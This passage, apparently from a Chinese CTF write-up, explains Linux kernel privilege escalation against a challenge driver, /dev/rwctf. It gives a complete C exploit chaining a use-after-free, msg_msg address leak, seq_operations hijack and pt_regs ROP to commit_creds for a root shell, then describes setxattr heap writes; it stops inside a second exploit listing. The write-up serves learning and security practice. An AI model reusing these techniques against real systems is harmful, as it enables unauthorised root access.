<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81e00ed0 &lt;swapgs_restore_regs_and_return_to_usermode&gt;:     jmp    0xffffffff81e00eeb </span><br><span class="line">0xffffffff81e00ed2 &lt;swapgs_restore_regs_and_return_to_usermode+2&gt;:   mov    ecx,0x48</span><br><span class="line">0xffffffff81e00ed7 &lt;swapgs_restore_regs_and_return_to_usermode+7&gt;:   mov    rdx,QWORD PTR gs:0x1ad08</span><br><span class="line">0xffffffff81e00ee0 &lt;swapgs_restore_regs_and_return_to_usermode+16&gt;:  and    edx,0xfffffffe</span><br><span class="line">0xffffffff81e00ee3 &lt;swapgs_restore_regs_and_return_to_usermode+19&gt;:  mov    eax,edx</span><br><span class="line">0xffffffff81e00ee5 &lt;swapgs_restore_regs_and_return_to_usermode+21&gt;:  shr    rdx,0x20</span><br><span class="line">0xffffffff81e00ee9 &lt;swapgs_restore_regs_and_return_to_usermode+25&gt;:  wrmsr</span><br><span class="line">0xffffffff81e00eeb &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;:  pop    r15</span><br><span class="line">0xffffffff81e00eed &lt;swapgs_restore_regs_and_return_to_usermode+29&gt;:  pop    r14</span><br><span class="line">0xffffffff81e00eef &lt;swapgs_restore_regs_and_return_to_usermode+31&gt;:  pop    r13</span><br><span class="line">0xffffffff81e00ef1 &lt;swapgs_restore_regs_and_return_to_usermode+33&gt;:  pop    r12</span><br><span class="line">0xffffffff81e00ef3 &lt;swapgs_restore_regs_and_return_to_usermode+35&gt;:  pop    rbp</span><br><span class="line">0xffffffff81e00ef4 &lt;swapgs_restore_regs_and_return_to_usermode+36&gt;:  pop    rbx</span><br><span class="line">0xffffffff81e00ef5 &lt;swapgs_restore_regs_and_return_to_usermode+37&gt;:  pop    r11</span><br><span class="line">0xffffffff81e00ef7 &lt;swapgs_restore_regs_and_return_to_usermode+39&gt;:  pop    r10</span><br><span class="line">0xffffffff81e00ef9 &lt;swapgs_restore_regs_and_return_to_usermode+41&gt;:  pop    r9</span><br><span class="line">0xffffffff81e00efb &lt;swapgs_restore_regs_and_return_to_usermode+43&gt;:  pop    r8</span><br><span class="line">0xffffffff81e00efd &lt;swapgs_restore_regs_and_return_to_usermode+45&gt;:  pop    rax</span><br><span class="line">0xffffffff81e00efe &lt;swapgs_restore_regs_and_return_to_usermode+46&gt;:  pop    rcx</span><br><span class="line">0xffffffff81e00eff &lt;swapgs_restore_regs_and_return_to_usermode+47&gt;:  pop    rdx</span><br><span class="line">0xffffffff81e00f00 &lt;swapgs_restore_regs_and_return_to_usermode+48&gt;:  pop    rsi</span><br><span class="line">0xffffffff81e00f01 &lt;swapgs_restore_regs_and_return_to_usermode+49&gt;:  mov    rdi,rsp</span><br><span class="line">0xffffffff81e00f04 &lt;swapgs_restore_regs_and_return_to_usermode+52&gt;:  mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81e00f0d &lt;swapgs_restore_regs_and_return_to_usermode+61&gt;:  push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81e00f10 &lt;swapgs_restore_regs_and_return_to_usermode+64&gt;:  push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81e00f13 &lt;swapgs_restore_regs_and_return_to_usermode+67&gt;:  push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81e00f16 &lt;swapgs_restore_regs_and_return_to_usermode+70&gt;:  push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81e00f19 &lt;swapgs_restore_regs_and_return_to_usermode+73&gt;:  push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81e00f1c &lt;swapgs_restore_regs_and_return_to_usermode+76&gt;:  push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81e00f1e &lt;swapgs_restore_regs_and_return_to_usermode+78&gt;:  push   rax</span><br></pre></td></tr></table></figure>
<p>如果直接从头运行，由于<code>pt_regs</code>在内核栈底，而且我们已经利用其ROP了一段，再进行这些pop操作很容易让rsp超出当前页面造成访问非法地址然后panic掉。所以一个解决方法时，我们利用到了哪一段寄存器，相应的寄存器就不pop了，按顺序直接从下一个寄存器运行。比如我们利用了r15-r12来写了ROP，其中r12 =&lt; swapgs_restore_regs_and_return_to_usermode+x,&gt;然后我们ROP执行<swapgs_restore_regs_and_return_to_usermode+x>处的指令，这时rsp指向了<code>pt_regs</code>的rbp寄存器，那么r12就应该是对应着<code>pop rbp</code>的指令，也就是<swapgs_restore_regs_and_return_to_usermode+35>。</p>
<p>最终exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> shmid;</span><br><span class="line">	<span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[X] Shmget Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[X] Shmat Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%lx&quot;,((uint64_t*)recv)[0x1fb]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getR00t</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Fail to get root\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Success!!! root now\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span>* buf = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = ADD_RSP_VAL_RET+offset;</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    pop_rdi_ret = POP_RDI_RET+offset;</span><br><span class="line">    init_cred = INIT_CRED+offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS+offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+offset;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下</p>
<p><img src="https://s2.loli.net/2023/01/21/h6KfLTtcP1vMUyC.png" alt=""></p>
<h3 id="利用setxattr进行写"><a href="#利用setxattr进行写" class="headerlink" title="利用setxattr进行写"></a>利用setxattr进行写</h3><p><code>setxattr</code>可以为我们提供近乎任意大小的内核空间object分配，其调用链如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure>
<p>在setxattr函数中有如下逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span></span><br><span class="line">setxattr(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span><br><span class="line">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用的方法就是类似这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(&quot;&#x2F;exp1&quot;, &quot;Photon&quot;, buf, 0x20, 0)</span><br></pre></td></tr></table></figure>
<p>倒数第二个参数是申请object的大小，buf是内容。</p>
<p>对于UAF来说，通过这个系统调用我们可以很方便的对某个free的object进行更改。但是之后这个object又会被放入free list,这会造成在offset偏移处写上某个指针(放入free list的object通过链表形式连在一起，类似用户态下的chunk，但是不一定是在头8个字节，似乎是根据object的大小而定的offset偏移处)。所以这个系统调用经常和<code>userfaultfd</code>一起使用,也就是俗称的<strong>堆占位</strong>技术。我还没有学习这个技术，不过听说userfaultfd在较新版本的内核当中变成了只有root才能使用的，所以可用性降低了许多。关于这个技术后面有时间学习一下写一篇blog整理一下。</p>
<p>用<code>setxattr</code>进行写的方法和题目给的写方法其实差不多。但是我实际测试的时候发现需要将之前释放的<code>shm_file</code>再申请上，不然后面执行system的时候会报<code>__kmalloc</code>的时候引用非法地址的错误</p>
<p>其exp和之前的大差不差，基本上就是把题目给的写操作换成了setxattr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 